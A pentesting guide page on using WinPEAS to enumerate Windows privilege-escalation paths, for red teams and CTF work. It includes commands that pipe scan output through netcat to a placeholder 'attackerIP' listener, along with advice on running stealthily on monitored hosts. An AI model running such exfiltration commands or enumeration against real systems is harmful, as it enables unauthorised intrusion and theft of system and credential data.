---
icon: windows
---

# WinPeas

## The WinPEAS Masterclass: Professional Windows Privilege Escalation & Post-Exploitation Enumeration

WinPEAS (Windows Privilege Escalation Awesome Script) is a comprehensive, automated post-exploitation tool for discovering privilege escalation paths and misconfigurations on Windows hosts. Its color-coded, sectioned output accelerates professional pentesting, red teaming, and CTF workflows by focusing attention on real-world exploitation opportunities.

***

### I. Environment Setup: Dynamic Variables

Prepare session variables for efficient WinPEAS deployment and output handling:

```bash
export TARGET_PATH="C:\\\\\\\\Temp\\\\\\\\winpeas.exe"
export OUTPUT_DIR="winpeas-results"
export OUTPUT_FILE="$OUTPUT_DIR/scan.txt"
export OUTPUT_HTML="$OUTPUT_DIR/scan.html"
export FILTER="null"             # Restrict output with filters such as "services", "scheduled tasks", etc.
export LISTENER_PORT=5555
export CUSTOM_OPTIONS=""         # e.g. "-a" for all checks, "-s" for stealth, "-h" for help

```

***

### II. Core Capabilities & Workflow

* **System Information Discovery:** OS version, architecture, build number, installed hotfixes, missing patches, and system security context.\[1]\[2]\[3]
* **User & Group Enumeration:** Finds active/disabled users, privilege groups, group memberships, logged-in sessions, and UAC settings.\[2]\[3]\[4]
* **File & Directory Permissions:** Highlights writable, insecure directories and files, including system paths.\[3]\[1]
* **Service & DLL Hijacking Checks:** Detects unquoted service paths, services with weak permissions, and DLL hijack opportunities—enabling exploitation by replacing binaries or DLLs.\[5]\[6]\[1]\[2]
* **Scheduled Task & Registry Checks:** Enumerates misconfigured scheduled tasks, insecure registry keys, AlwaysInstallElevated settings, auto-start entries, and potential credential exposure.\[6]\[1]\[3]
* **Credential Discovery:** Scans registry, autologon, Windows Vault, Credential Manager, and LSASS/SAM for cached or exposed credentials.\[4]\[3]
* **Defensive/Detection Info:** Reports firewall, AV/EDR status, logging configuration, and network connections for stealth and post-exploitation planning.\[3]\[4]
* **Color-Coded Output:** Red, yellow, and green output highlights critical, medium, and informational leads for rapid triage and exploitation.\[4]\[5]\[6]
* **No Admin Required (Fuller Results With Admin):** Runs well as user, but reveals deeper vectors with elevated privilege.\[3]

***

### III. Professional Usage Examples

#### 1. Run Interactive Scan & Save Output

```powershell
.\\\\winpeas.exe > "$OUTPUT_FILE"

```

#### 2. Stealth Scan (Minimal Output)

```powershell
.\\\\winpeas.exe -s > "$OUTPUT_FILE"

```

#### 3. Scan Only Specific Sections (e.g., Services)

```powershell
.\\\\winpeas.exe services > "$OUTPUT_FILE"

```

#### 4. Remote Output Collection (Reverse Shell/Lab)

```powershell
.\\\\winpeas.exe | nc attackerIP $LISTENER_PORT

```

#### 5. HTML Export for Triage/Reporting

_Parse the output with a powershell/html utility or use Winpeas++ if needed for more advanced export._

***

### IV. Advanced Techniques & Scenarios

* **Interpretation Workflow:** Focus on red and yellow findings relating to unquoted service paths, AlwaysInstallElevated, writable directories, weak service permissions, insecure registry settings, scheduled task misconfigs, and exposed credentials.\[6]
* **Automate Output Parsing:** Use grep/findstr/PowerShell, or log parsers to prioritize actionable vulnerabilities.
* **Run Under Different Users/Contexts:** Run as standard user then with admin escalation for maximal coverage.
* **OPSEC and Stealth:** Use stealth mode (-s) for light/noisy enumeration on active targets.
* **Combine with Post-Exploitation:** Use findings to select practical privesc exploits (DLL/replacement binary, MSI installers, service misconfigs).
* **Continuous Monitoring and Audit:** Schedule regular runs for drift analysis and new misconfig detection on critical Windows hosts.

***

### V. Real-World Workflow Example

1. **Upload WinPEAS and Run**

Transfer `winpeas.exe` to the target (via SMB, RDP, Meterpreter, or upload module):

```powershell
C:\\\\Temp\\\\winpeas.exe > C:\\\\Temp\\\\winpeas_scan.txt

```

1. **Stealth Scan; Output to Listener**

```powershell
C:\\\\Temp\\\\winpeas.exe -s | nc attackerIP 5555

```

1. **Review Output, Focus on Red/Yellow**

* Unquoted service path? DLL hijack? Weak permissions?
* Document, attempt exploit, submit for bug bounty, or add to incident report.

***

### VI. Pro Tips & Best Practices

* Prioritize high-severity (red/yellow) findings—these are most readily exploitable.
* Run WinPEAS with both user and administrator privileges for comparative analysis.
* Regularly update WinPEAS for new checks (print exploits, hotfixes, mitigation bypasses).
* Parse and aggregate findings for multi-host assessments.
* Combine with BloodHound/PowerUp for full AD privilege escalation mapping.
* Use stealth mode on blue team–monitored hosts.
* Respect engagement scope and keep audit logs for every scan.

***

This WinPEAS guide enables rapid, actionable, and comprehensive Windows privilege escalation enumeration, empowering red teamers, pentesters, and bug bounty hunters in their post-exploitation workflows.\[7]\[8]\[1]\[2]\[5]\[4]\[6]\[3]

Sources \[1] Privilege escalations on Windows with WinPEAS [https://www.manageengine.com/log-management/cyber-security/privilege-escalation-with-winpeas.html](https://www.manageengine.com/log-management/cyber-security/privilege-escalation-with-winpeas.html) \[2] How does WinPEAS help identify potential privilege ... [https://winpeas.com/how-does-winpeas-help-identify-potential-privilege/](https://winpeas.com/how-does-winpeas-help-identify-potential-privilege/) \[3] What Types of Information Does WinPEAS Gather from a ... [https://winpeas.com/what-types-of-information-does-winpeas-gather/](https://winpeas.com/what-types-of-information-does-winpeas-gather/) \[4] Lab 85 – How to enumerate for privilege escalation on a ... [https://www.101labs.net/comptia-security/lab-85-how-to-enumerate-for-privilege-escalation-on-a-windows-target-with-winpeas/](https://www.101labs.net/comptia-security/lab-85-how-to-enumerate-for-privilege-escalation-on-a-windows-target-with-winpeas/) \[5] WinPEAS - Windows Privilege Escalation Tool[https://winpeas.com](https://winpeas.com) \[6] How to Interpret WinPEAS Output to Prioritize Privilege ... [https://winpeas.com/how-to-interpret-winpeas-output-to-prioritize-escala/](https://winpeas.com/how-to-interpret-winpeas-output-to-prioritize-escala/) \[7] Post-Exploitation Privilege Escalation Tools | Ethical Hacking [https://armur.ai/ethical-hacking/post/post-1/post-exploitation-privilege-escalation-tools/](https://armur.ai/ethical-hacking/post/post-1/post-exploitation-privilege-escalation-tools/) \[8] PEASS - Privilege Escalation Awesome Scripts SUITE ... [https://github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng)
